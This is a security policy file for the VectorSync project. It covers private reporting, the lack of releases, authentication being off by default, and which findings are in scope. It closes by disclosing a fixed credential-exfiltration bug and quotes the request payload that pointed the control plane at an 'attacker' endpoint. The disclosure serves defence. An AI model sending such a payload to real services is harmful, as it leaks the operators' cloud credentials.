# Security policy

## Reporting a vulnerability

Report privately through GitHub's private vulnerability reporting for this repository:

**https://github.com/Nandakumar-Balagopal/VectorSync/security/advisories/new**

That form is the channel. It works only while private vulnerability reporting is enabled on the
repository (a per-repository toggle under the repository's own Settings, in the code-security
section). If the link returns a 404 the setting is off and no report can be filed privately: open a
public issue that asks for it to be switched on and contains no exploit detail, and nothing more
than that.

Do not open a public issue or a pull request for a suspected vulnerability. A PR that fixes one
describes it to everyone reading the diff.

This project is maintained by one person and has no paid security response. What that means in
practice, stated so it is not mistaken for an SLA:

- Acknowledgement is best effort, normally within a week.
- There is no bug bounty.
- Credit in the advisory if you want it.

A useful report contains: the endpoint or code path, the request or input that triggers it, what an
attacker gains, and the version (commit sha — there are no releases yet, see below).

## Supported versions

There are no tagged releases. The project version is `0.1.0-SNAPSHOT` and the only supported code is
the current `main`. Fixes land there and nowhere else; there is no backport branch to ask about.

## Deployment posture: trusted network by default, authentication available

**Authentication exists but is off by default.** The control plane (`:8080`), the worker (`:8081`)
and the search service (`:8083`) each have a `SecurityFilterChain` providing deny-by-default HTTP
Basic with two roles, and it is enabled with a single property:

```
vectorsync.auth.enabled=true
VECTORSYNC_AUTH_ADMIN_PASSWORD=...     # human / automation, ≥16 chars
VECTORSYNC_AUTH_WORKER_PASSWORD=...    # worker → control plane, machine-to-machine
```

There is no default password and there is no placeholder that works: with authentication enabled and
a missing, short, or recognisably-placeholder secret, **the service refuses to start** and names the
variable to set. A committed default would be worse than none, because every other guard would read
as satisfied. `/actuator/health` stays anonymous so orchestration can probe it; `/actuator/metrics`
does not, because the derivation counters are tagged with source table names and configuration ids.

**With `vectorsync.auth.enabled` left at its default, no endpoint is authenticated.** Anyone who can
reach a port can register a materialization, drive a derivation, promote an index, or read every
vector. That default is a **documented design gap, not a vulnerability report**, and the reason it is
still the default is specific: the dashboard's nginx/vite proxy, the five scripts under
`deployment/`, and the benchmark clients under `bench/` do not yet send a credential, so enabling
authentication by default would break the demo stack and every script that produced the measurements
in the docs. Wiring those callers is the remaining work between opt-in and on-by-default, and it is
tracked as such rather than presented as done.

The embedding service (`:8000`) has no authentication and is not covered by the above.

Two consequences an operator should know before deploying:

- `docker-compose.yml` publishes every service port on all host interfaces (no `127.0.0.1` binding).
  On a host with a public address, that stack is public. The compose file is a demo and development
  stack.
- Credentials in `.env.example` are placeholders (`change-me`), and object-store credentials for the
  warehouse are held by the services as configuration. Those secrets are as exposed as the network
  the services sit on.

So the following are **out of scope** as reports, because they are already stated above:

- "Endpoint X requires no authentication" — with `vectorsync.auth.enabled` at its default. A path
  that stays reachable *with* authentication enabled, other than `/actuator/health`, is in scope and
  worth reporting.
- "The compose stack ships default credentials." (They are placeholders in `.env.example`; `.env` is
  not tracked.)
- Findings against the `dashboard` demo UI, or against the mock embedding provider used in tests.

## In scope

Anything that breaks the trusted-network assumption rather than merely relying on it. Concretely:

- Disclosing server-held secrets to a caller, or sending them to a destination the caller chose.
- Server-side request forgery using the services' own credentials or network position.
- Reading or writing outside the configured warehouse — path traversal in a table name, namespace or
  artifact URI.
- SQL injection, or any injection into the Iceberg or Hadoop configuration built from request input.
- Remote code execution or deserialization of untrusted input.
- Secrets reaching logs or an HTTP error body.
- A vulnerability in a declared dependency that is actually reachable from this code. Dependency
  updates here are manual; there is no automated scanning yet.

### There is precedent, so this list is not hypothetical

A real confused-deputy credential-exfiltration bug has been found and fixed in
`control-plane/src/main/java/io/vectorsync/controlplane/controller/TableSyncController.java`. The
earlier version filled in missing object-store credentials from the control plane's own
configuration — convenient, so the dashboard need not handle secrets — while still honoring a
caller-supplied `awsEndpoint`. A request carrying `{"awsEndpoint":"http://attacker/"}` and no
credentials therefore made the control plane authenticate to an attacker-chosen host with the
warehouse's own long-lived keys. `fs.s3a.connection.ssl.enabled` was additionally hardcoded off, so
the keys crossed the network in plaintext even when the endpoint was `https`.

The fix, which is the shape any similar fix should take:

- Credentials and the endpoint they travel to are **one all-or-nothing group**, taken entirely from
  the request or entirely from configuration, never mixed. Half a credential pair is rejected, and a
  caller-supplied endpoint without caller-supplied credentials is rejected with that reason stated in
  the response.
- TLS **follows the endpoint scheme** instead of being pinned, so an `https` endpoint is never
  silently downgraded.

That bug was reachable by anyone who could reach the port — which is exactly why "the network is
trusted" does not excuse handing out a secret.
